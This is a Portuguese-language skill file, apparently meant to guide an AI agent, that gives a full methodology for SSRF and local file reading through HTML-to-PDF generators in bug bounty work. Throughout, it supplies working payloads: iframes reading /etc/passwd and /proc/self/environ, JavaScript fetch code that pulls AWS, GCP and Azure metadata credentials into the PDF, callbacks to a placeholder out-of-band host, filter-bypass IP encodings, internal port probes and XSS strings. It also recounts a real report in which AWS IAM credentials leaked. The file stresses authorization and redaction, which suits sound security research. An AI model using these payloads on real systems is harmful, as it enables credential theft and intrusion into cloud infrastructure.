---
name: ssrf-pdf-generator
description: Metodologia completa de SSRF e LFI em geradores de PDF (HTML-to-PDF) para bug bounty e pentest autorizado. Use SEMPRE que o alvo tiver qualquer funcionalidade que transforme conteúdo em PDF — exportar currículo/perfil, gerar fatura, recibo, relatório, certificado, crachá, etiqueta, ticket, extrato — ou quando aparecer endpoint com nome tipo export_pdf, export_resume_pdf, download_pdf, print, generate_report, invoice, ou parâmetros layout=, template=, html=, url=, download_url=, format=pdf. Também use quando o usuário mencionar "SSRF em PDF", "PDF generator", "wkhtmltopdf", "puppeteer PDF", "iframe no PDF", "metadata AWS via PDF", "169.254.169.254". O padrão central é STORED-then-RENDER: o ponto de INJEÇÃO (um campo de perfil, descrição, endereço, nome) é um request DIFERENTE do ponto de DISPARO (o endpoint que gera o PDF) — a aplicação escapa o HTML na tela mas não no template do PDF. Cobre: descoberta do endpoint via análise de arquivos JS, fingerprint do motor de renderização pelos metadados do PDF (wkhtmltopdf, headless Chrome, WeasyPrint, DomPDF, PhantomJS), matriz de payloads por capacidade (iframe, img, link, object, script, fetch, CSS @import), leitura de arquivo local via file://, endpoints de metadata de todas as clouds (AWS IMDSv1/v2, GCP, Azure, Alibaba, DigitalOcean, Oracle) e por que IMDSv2/GCP/Azure exigem header e só funcionam com JS habilitado, varredura de rede interna, SSRF cego com OOB, regras de confirmação e de segurança (nunca usar credencial obtida, sempre redigir no report). Só usar dentro do escopo formalmente autorizado.
---

# SSRF / LFI em Geradores de PDF

Metodologia para explorar geradores de PDF baseados em HTML. Praticamente todo
"exportar para PDF" é um **navegador headless rodando no servidor** que recebe
HTML e devolve um PDF. Se qualquer parte desse HTML vem de input do usuário e
não é escapada, você tem execução de HTML **do lado do servidor** — o que
significa SSRF, leitura de arquivo local e, com frequência, vazamento de
credenciais de cloud.

**Pré-condição obrigatória**: só use esta skill dentro do escopo formalmente
autorizado. Regra de ouro: **provar o acesso, nunca usá-lo**. Se obtiver
credenciais de cloud, não as utilize para autenticar em nada — tire o print,
redija o valor e reporte (ver seção 9).

## 1. O padrão central — STORED-then-RENDER

Esta é a ideia que faz a skill funcionar, e é o que a maioria das pessoas
perde:

```
   [ REQUEST 1 - INJEÇÃO ]                [ REQUEST 2 - DISPARO ]
   PATCH /api/profile                     GET /api/export_pdf?layout=
   { "experience": "<iframe src=...>" }            |
              |                                    v
              v                          servidor monta o HTML do PDF
        salvo no banco  ------------------>  com o campo salvo dentro
                                                   |
                                                   v
                                     navegador headless RENDERIZA
                                                   |
                                                   v
                                        PDF contém o resultado
```

Consequências práticas:

1. **O campo pode parecer seguro na tela e não ser no PDF.** A interface web
   escapa o HTML ao exibir o perfil; o template do PDF é outro código, muitas
   vezes concatenando string sem escape. Não descarte um campo só porque ele
   aparece escapado na página.
2. **Testar a injeção sozinha não revela nada.** Você precisa salvar o payload
   E depois chamar o endpoint de exportação. Quem só olha a resposta do PATCH
   conclui que não há bug.
3. **Todo campo do perfil é um candidato.** Nome, sobrenome, cargo, empresa,
   descrição, experiência, formação, endereço, bio, skills, URL do site.
   Injete um marcador diferente em cada um, gere o PDF e veja qual apareceu.

### 1.1 Injeção direta (variante mais simples)

Alguns geradores aceitam o conteúdo direto no parâmetro — aí injeção e disparo
são o mesmo request:

```
GET /export?html=<iframe src="file:///etc/passwd">
GET /pdf?url=http://169.254.169.254/latest/meta-data/
GET /print?template=<img src="http://SEU-OOB/">
```

Teste as duas variantes. A direta é rara em produção (costuma já ter sido
achada), a stored-then-render é onde ainda há bug.

## 2. Descoberta do endpoint — os arquivos JS são o caminho

O endpoint de PDF quase nunca está exposto na interface. O caminho que funciona:

1. Crie conta e faça login (a funcionalidade costuma ser autenticada).
2. Esgote as funções visíveis primeiro — mas não pare aí.
3. **Baixe e leia todos os arquivos JavaScript da aplicação.** Muitos arquivos
   JS é um bom sinal: é onde ficam as rotas que a interface não expõe.
   Use a skill `bughunter` para essa etapa.
4. Extraia todas as rotas e parâmetros e procure os padrões abaixo.

**Nomes de endpoint que indicam gerador de PDF:**

```
export_pdf        export_resume_pdf    download_pdf      generate_pdf
print             printable            to_pdf            render_pdf
invoice           receipt              statement         report
resume            cv                   certificate       badge
label             ticket               contract          quote
```

**Parâmetros que indicam o motor de template:**

```
layout=      template=     html=        url=
download_url=  file=       src=         format=pdf
theme=       style=        content=     page=
```

**Observação de campo:** a mesma varredura de JS que revela o endpoint de PDF
costuma revelar bugs vizinhos. No caso real que originou esta skill, a mesma
leitura de JS entregou três achados: um DOM XSS em `viewfile?download_url=`
(com `javascript:prompt(4)`), um XSS refletido em `upload?queryhost=` (com
`"><svg/onload=confirm(1)>`) e o SSRF no gerador de PDF. Registre todos.

## 3. Fingerprint do motor de renderização

**Faça isso antes de escolher payload** — cada motor tem capacidades
diferentes, e escolher o payload errado faz você concluir que não há bug.

Gere um PDF limpo (sem payload) e leia os metadados:

```bash
exiftool arquivo.pdf | grep -iE 'producer|creator'
pdfinfo arquivo.pdf | grep -iE 'producer|creator'
strings arquivo.pdf | grep -iE 'wkhtmltopdf|chrome|skia|weasyprint|dompdf|tcpdf|prince|phantom' | head
```

| Motor | JS? | `file://`? | Observações |
|---|---|---|---|
| **wkhtmltopdf** | opcional | **sim** | O clássico. `iframe` e `file://` funcionam. Producer costuma dizer `wkhtmltopdf` ou `Qt`. |
| **Headless Chrome / Puppeteer** | **sim** | limitado | Sandbox costuma bloquear `file://`, mas `iframe` para rede interna funciona. Producer: `Skia/PDF`. |
| **PhantomJS** | **sim** | **sim** | Antigo e abandonado, muito permissivo. |
| **WeasyPrint** | não | **sim** | Python. `<img src="file://">`, `<link>` e `@import` funcionam. |
| **DomPDF** | não | parcial | PHP. `<img>` com wrappers. Tem CVE de RCE por injeção de fonte (CVE-2022-28368). |
| **TCPDF / mPDF** | não | limitado | Suporte a HTML bem restrito. |
| **Prince XML** | opcional | sim | Producer: `Prince`. |
| **iText (Java)** | não | — | Avaliar também vetor de XXE. |

Se não há JS, esqueça `fetch`/`<script>` e vá de `iframe`/`img`/`link`/`@import`.
Se há JS, você ganha a capacidade de **enviar headers** — o que abre IMDSv2,
GCP e Azure (seção 5.2).

## 4. Matriz de payloads

Injete um por vez, com um marcador único, para saber qual campo e qual tag
funcionou.

### 4.1 Renderização visível (o melhor caso — o conteúdo aparece no PDF)

```html
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="800"></iframe>
<iframe src="file:///etc/passwd" width="600" height="600"></iframe>
<object data="file:///etc/passwd" width="800" height="800"></object>
<embed src="file:///etc/passwd" width="800" height="800">
```

### 4.2 Confirmação cega (OOB — só confirma que houve requisição)

```html
<img src="http://SEU-OOB.oast.fun/img">
<link rel="stylesheet" href="http://SEU-OOB.oast.fun/css">
<script src="http://SEU-OOB.oast.fun/js"></script>
<style>@import url("http://SEU-OOB.oast.fun/import");</style>
<style>body{background:url("http://SEU-OOB.oast.fun/bg")}</style>
<base href="http://SEU-OOB.oast.fun/">
```

Se o OOB registrar o hit, o **IP de origem é o do servidor** — anote, é a prova
do SSRF e revela o range interno/cloud provider.

### 4.3 Exfiltração via JS (só se o motor executar JavaScript)

Traz o conteúdo para dentro do PDF, contornando a limitação do `iframe` de não
enviar headers:

```html
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => { document.body.innerHTML = '<pre>' + t + '</pre>'; });
</script>
```

Com header (necessário para IMDSv2, GCP e Azure):

```html
<script>
fetch('http://metadata.google.internal/computeMetadata/v1/?recursive=true',
      { headers: { 'Metadata-Flavor': 'Google' } })
  .then(r => r.text())
  .then(t => { document.body.innerHTML = '<pre>' + t + '</pre>'; });
</script>
```

**Atenção ao timing:** o renderizador pode fechar a página antes do `fetch`
resolver. Se vier vazio, force uma espera — vários motores respeitam
`--javascript-delay` ou aguardam `window.status`. Um `while` bloqueante curto
ou um segundo `iframe` como âncora costuma resolver.

### 4.4 Leitura de arquivo local

```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ          <- variáveis de ambiente, muito valioso
file:///proc/self/cmdline
file:///proc/self/cwd/             <- diretório da app
file:///proc/net/tcp               <- portas internas em escuta
file:///root/.aws/credentials
file:///home/app/.aws/credentials
file:///var/www/html/.env
file:///app/.env
file:///etc/nginx/nginx.conf
file:///C:/Windows/win.ini         <- alvo Windows
```

`/proc/self/environ` costuma render mais que `/etc/passwd`: traz variáveis de
ambiente com segredos, e o `/etc/passwd` só prova a leitura.

## 5. Endpoints de metadata por cloud

### 5.1 Sem header — funcionam com `iframe` puro

**AWS (IMDSv1)** — sempre em dois passos:

```
1) http://169.254.169.254/latest/meta-data/iam/security-credentials/
   -> devolve o NOME da role (ex.: aws-elasticbeanstalk-ec2-role)

2) http://169.254.169.254/latest/meta-data/iam/security-credentials/NOME-DA-ROLE
   -> devolve AccessKeyId, SecretAccessKey e Token
```

Não adivinhe o nome da role — leia no passo 1. Outros caminhos úteis:
`/latest/meta-data/`, `/latest/user-data/` (frequentemente traz script de
provisionamento com segredos), `/latest/dynamic/instance-identity/document`
(revela account ID e região).

**Alibaba Cloud** (relevante em alvo com operação na China):
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

**DigitalOcean**: `http://169.254.169.254/metadata/v1.json`
**Oracle Cloud**: `http://192.0.0.192/latest/`

### 5.2 Exigem header — só com JS habilitado (seção 4.3)

| Cloud | URL | Header obrigatório |
|---|---|---|
| **AWS IMDSv2** | `/latest/api/token` (PUT) e depois `/latest/meta-data/` | `X-aws-ec2-metadata-token-ttl-seconds` / `X-aws-ec2-metadata-token` |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/?recursive=true` | `Metadata-Flavor: Google` |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |

Se o motor **não** executa JS, esses três estão fora de alcance por `iframe` —
e isso não significa que não há SSRF. Confirme o SSRF com OOB (seção 4.2) e
reporte assim mesmo; IMDSv2 corretamente configurado é uma mitigação, não uma
ausência de bug.

## 6. Rede interna

O SSRF não vale só para metadata. Depois de confirmar, mapeie o que o servidor
alcança:

```html
<iframe src="http://127.0.0.1:80/"      width="800" height="600"></iframe>
<iframe src="http://localhost:8080/"    width="800" height="600"></iframe>
<iframe src="http://127.0.0.1:6379/"    width="800" height="600"></iframe>  <!-- Redis -->
<iframe src="http://127.0.0.1:9200/"    width="800" height="600"></iframe>  <!-- Elasticsearch -->
<iframe src="http://127.0.0.1:8500/"    width="800" height="600"></iframe>  <!-- Consul -->
<iframe src="http://127.0.0.1:2375/version" width="800" height="600"></iframe>  <!-- Docker -->
```

Hostnames internos encontrados em JS, em `/proc/self/environ` ou em stack
traces também são alvos. **Somente leitura** — nada de POST em Redis/Docker.

### 6.1 Bypass de filtro de URL

Se houver blocklist para `169.254.169.254` ou `localhost`:

```
http://169.254.169.254        -> forma normal
http://[::ffff:169.254.169.254]
http://2852039166/            -> decimal
http://0251.0376.0251.0376/   -> octal
http://0xA9FEA9FE/            -> hexadecimal
http://169.254.169.254.nip.io/
http://metadata.google.internal/   -> nome, não IP
http://127.1/                 -> forma curta
http://0/
```

Redirect também funciona: aponte o `iframe` para um host seu que responda
`302` para o IMDS — muitos filtros só validam a URL inicial.

## 7. Fluxo de execução

```
1. Achar o endpoint de PDF        -> análise de JS (seção 2)
2. Gerar um PDF limpo             -> fingerprint do motor (seção 3)
3. Mapear campos que entram no PDF-> marcador único por campo
4. Testar renderização de HTML    -> <b>TESTE</b> ou <h1>TESTE</h1>
                                     saiu formatado = HTML é interpretado
5. Confirmar SSRF com OOB         -> <img src="http://OOB/">  (seção 4.2)
6. Escalar                        -> iframe para IMDS / file:// (4.1, 4.4, 5)
7. Mapear alcance interno         -> seção 6
8. Confirmar e reportar           -> seções 8 e 9
```

O passo 4 é o mais barato e o mais informativo: se `<b>TESTE</b>` sai em
negrito no PDF, o HTML está sendo interpretado e todo o resto vale a pena. Se
sai literal como texto, aquele campo está escapado — tente outro campo.

## 8. Confirmação — zero falso positivo

1. **O conteúdo apareceu no PDF?** Print da página do PDF com o dado é a prova
   mais forte. Guarde o PDF.
2. **Bateu no OOB?** Registre o IP de origem, o horário e o User-Agent — o UA
   costuma identificar o motor e reforça o report.
3. **Controle:** gere o PDF sem o payload e compare. O dado tem que aparecer
   **só** com a injeção.
4. **Reproduza** o ciclo inteiro (injetar → gerar → ler) pelo menos duas vezes.
5. Cuidado com falso positivo de `iframe` vazio: uma moldura em branco no PDF
   não prova nada — o motor pode ter tentado e falhado. Sem conteúdo legível
   ou hit no OOB, não é confirmação.

## 9. Segurança e report

**Nunca use a credencial obtida.** Não chame `sts:GetCallerIdentity`, não
liste bucket, não autentique em nada. Isso deixa de ser prova de conceito e
vira acesso não autorizado. A prova é o PDF mostrando a credencial.

No report:

1. Passo a passo completo e numerado: onde injetar, o que injetar, qual
   endpoint chamar depois.
2. O PDF gerado como anexo, com o segredo **redigido** (`[REDACTED]`) — mostre
   o suficiente para provar (nome da role, prefixo `ASIA...`), nunca a chave
   inteira.
3. Diga qual motor de renderização foi identificado e como.
4. Impacto: SSRF que lê metadata de cloud é **High/Critical** — credenciais IAM
   permitem movimento lateral na infraestrutura. `file://` adiciona leitura
   arbitrária de arquivo.
5. Remediação a sugerir: desabilitar carregamento de recursos externos e
   `file://` no renderizador, escapar todo input no template do PDF, rodar o
   renderizador em rede isolada sem acesso ao IMDS, e migrar para IMDSv2.

## 10. Caso real que originou esta skill

Programa público, subdomínio esquecido encontrado por Google dork:

```
site:*.alvo.com -app. -store. -www.
```

Chegou numa página de login. Conta criada, login feito. A interface só tinha
troca de nome de usuário e upload de arquivo. Tentativa de IDOR nas requests
visíveis: **sem sucesso**.

Virada de chave: em vez de parar, foi ler os **arquivos JavaScript**. A
aplicação tinha muitos JS — sinal bom, porque é onde ficam as rotas ocultas.
Três endpoints saíram dali:

**1) DOM XSS** (duplicado, mas achado):
```
http://alvo.com/viewfile?download_url=javascript:prompt(4)
```

**2) XSS refletido** (pago):
```
https://alvo.com/app/secret/upload?queryhost="><svg/onload=confirm(1)>
```

**3) O gerador de PDF** — o achado principal:
```
https://alvo.com/api/resume_coach/export_resume_pdf?layout=
```

Um GET nesse endpoint devolvia **o conteúdo do perfil do usuário renderizado
em PDF**. Essa é a observação que fecha o caso: se o endpoint renderiza o
perfil, e o perfil é controlado pelo usuário, então o perfil é o ponto de
injeção e o endpoint é o gatilho.

O payload foi salvo no campo **"Experience"** do próprio perfil:

```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role"></iframe>
```

Depois, acessando `/api/resume_coach/export_resume_pdf?layout=`, as credenciais
IAM da role saíram impressas no PDF.

Leitura de arquivo local confirmada com o mesmo método:

```html
<iframe src='file:///etc/passwd' width='600' height='600'>
```

**Resultado**: reportado ao programa Starbucks no HackerOne como report
**#2604393 — "SSRF LEADS TO AWS METADATA LEAK"**, asset `www.starbucks.com`,
severidade **High (CVSS 7.5)**, CWE-918, **bounty de US$ 1.260**. Criado em
16/07/2024, triado em 18/07, fechado em 30/07/2024.

**Lições transferíveis:**

- Interface pobre não significa alvo pobre. As três vulnerabilidades estavam
  em rotas que a interface nunca mostrou.
- "Muitos arquivos JS" é sinal de superfície escondida — trate a leitura de JS
  como etapa obrigatória, não como último recurso.
- Um endpoint que **renderiza dado do usuário** é sempre candidato a
  stored-then-render, mesmo que o dado pareça inofensivo na tela.
- Falhar em IDOR não é sinal de parar; é sinal de mudar de camada.

## 11. Checklist

- [ ] Endpoint de geração de PDF identificado (via JS, não só pela interface).
- [ ] PDF limpo gerado e motor de renderização fingerprintado (`exiftool`).
- [ ] Todos os campos de input mapeados com marcador único.
- [ ] Teste de interpretação de HTML feito (`<b>TESTE</b>`) antes dos payloads.
- [ ] SSRF confirmado por OOB, com IP de origem registrado.
- [ ] IMDS testado no formato correto da cloud identificada (dois passos na AWS).
- [ ] Se o motor executa JS, IMDSv2/GCP/Azure testados com header via `fetch`.
- [ ] `file://` testado, incluindo `/proc/self/environ`.
- [ ] Alcance de rede interna mapeado — somente leitura.
- [ ] Controle feito: PDF sem payload não contém o dado.
- [ ] Ciclo reproduzido duas vezes.
- [ ] Credencial obtida NÃO foi usada em lugar nenhum.
- [ ] Report com passo a passo, PDF anexo e segredo redigido.
